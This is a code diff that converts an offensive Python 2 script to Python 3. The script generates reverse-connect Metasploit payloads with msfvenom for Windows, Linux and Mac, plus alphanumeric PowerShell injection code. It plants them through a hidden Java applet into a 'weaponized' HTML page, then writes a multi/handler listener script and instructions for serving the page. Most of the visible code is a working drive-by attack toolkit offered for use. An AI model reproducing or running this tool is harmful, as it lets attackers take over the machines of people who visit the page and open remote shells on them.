@@ -24,9 +24,6 @@ WINDOWS_PORT = 3000
 LINUX_PORT = 3001
 OSX_PORT = 3002
 
-reload(sys)
-sys.setdefaultencoding('utf8')
-
 def generate_random_string(low, high):
     length = random.randint(low, high)
     letters = string.ascii_letters # + string.digits
@@ -171,7 +168,7 @@ def generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2):
 APPLET_TEMPLATE = '<applet code="Java.class" width="1" height="1" archive="applet.jar"><param name="name"><param name="1" value="http://ipaddrhere/msf.exe"><param name="2" value=""><param name="3" value="http://ipaddrhere/mac.bin"><param name="4" value="http://ipaddrhere/nix.bin"><param name="5" value="PowershellInjectionCodeGoesHere"><param name="6" value="PowershellInjectionCodeGoesHere"><param name="7" value="freehugs"><param name="8" value="YES"><param name="9" value=""><param name="10" value=""><param name="separate_jvm" value="true"></applet>'
 
 def print_usage():
-    print """
+    print("""
 Usage:
   {prog} [-w <payload>] [-l <payload>] [-m <payload>] <html_file> <ip>
   {prog} -h
@@ -186,7 +183,7 @@ Options:
   <ip>          The IP address the payload should connect back to.
 
 Note: The default ports used for the Windows, Linux, and Mac listeners are 3000, 3001, and 3002 respectively.
-""".format(prog=sys.argv[0], windows=WINDOWS_DEFAULT, linux=LINUX_DEFAULT, osx=OSX_DEFAULT)
+""".format(prog=sys.argv[0], windows=WINDOWS_DEFAULT, linux=LINUX_DEFAULT, osx=OSX_DEFAULT))
 
 def perform_checks():
   try:
@@ -194,7 +191,7 @@ def perform_checks():
   except OSError:
     pass
   if not os.path.isdir('output'):
-    print 'Unable to create output directory. Please ensure that the current directory is writable.'
+    print('Unable to create output directory. Please ensure that the current directory is writable.')
     return False
   return True
 
@@ -206,7 +203,7 @@ if __name__ == '__main__':
   optlist, args = getopt.getopt(sys.argv[1:], 'hw:l:m:')
   if len(args) < 2:
     print_usage()
-    print 'Error: You did not specify a required argument. Please specify an html file to modify and an IP address to connect back to.'
+    print('Error: You did not specify a required argument. Please specify an html file to modify and an IP address to connect back to.')
     sys.exit()
 
   html_filename = args[0]
@@ -227,16 +224,16 @@ if __name__ == '__main__':
     elif opt == '-m':
       osx = arg
 
-  print 'Generating Windows payload: {payload}...'.format(payload=windows)
+  print('Generating Windows payload: {payload}...'.format(payload=windows))
   os.system('{msfp}msfvenom -p {payload} -f exe LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=windows, ip=ip_address, port=WINDOWS_PORT, output=os.path.join('output', 'msf.exe')))
-  print 'Generating Linux payload: {payload}...'.format(payload=linux)
+  print('Generating Linux payload: {payload}...'.format(payload=linux))
   os.system('{msfp}msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=linux, ip=ip_address, port=LINUX_PORT, output=os.path.join('output', 'nix.bin')))
-  print 'Generating Mac OS X payload: {payload}...'.format(payload=osx)
+  print('Generating Mac OS X payload: {payload}...'.format(payload=osx))
   os.system('{msfp}msfvenom -p {payload} -f elf LHOST={ip} LPORT={port} > {output} 2> /dev/null'.format(msfp=msfpath, payload=osx, ip=ip_address, port=OSX_PORT, output=os.path.join('output', 'mac.bin')))
-  print "Generating x86-based powershell injection code..."
+  print("Generating x86-based powershell injection code...")
   x86 = str(generate_powershell_alphanumeric_payload(windows, ip_address, str(WINDOWS_PORT), ''))
 
-  print 'Weaponizing html...'
+  print('Weaponizing html...')
   shutil.copy('applet.jar', 'output')
 
   with open(html_filename, 'r') as html_infile:
@@ -247,7 +244,7 @@ if __name__ == '__main__':
       weaponized_html = weaponized_html.replace("PowershellInjectionCodeGoesHere",x86)
       html_outfile.write(weaponized_html)
 
-  print 'Creating listener resource script...'
+  print('Creating listener resource script...')
   with open(os.path.join('output', 'listeners.rc'), 'w') as resource_file:
     resource_file.write("""\
 use exploit/multi/handler
@@ -281,10 +278,12 @@ echo "You may now surf to http://{ip_address}/"
     osx_port=OSX_PORT,
   ))
 
-  print 'All output written to the "output" directory.'
-  print
-  print 'Run "serve.sh" to easily stand up a server.'
-  # print 'Start your Metasploit listeners using the command: msfconsole -r output/listeners.rc'
-  # print 'Then copy the remaining files in your output directory to your web root (usually /var/www/).'
-  # print 'Alternatively, start a lightweight webserver using the command: cd output && python -m SimpleHTTPServer'
+  print('All output written to the "output" directory.')
+  print()
+  print('Run "serve.sh" to easily stand up a server.')
+  print()
+  print('Otherwise, run the server manually like so:')
+  print('\tStart your Metasploit listeners using the command: msfconsole -r output/listeners.rc')
+  print('\tThen copy the remaining files in your output directory to your web root (usually /var/www/).')
+  print('\tAlternatively, start a lightweight webserver using the command: cd output && python3 -m http.server 80')
 
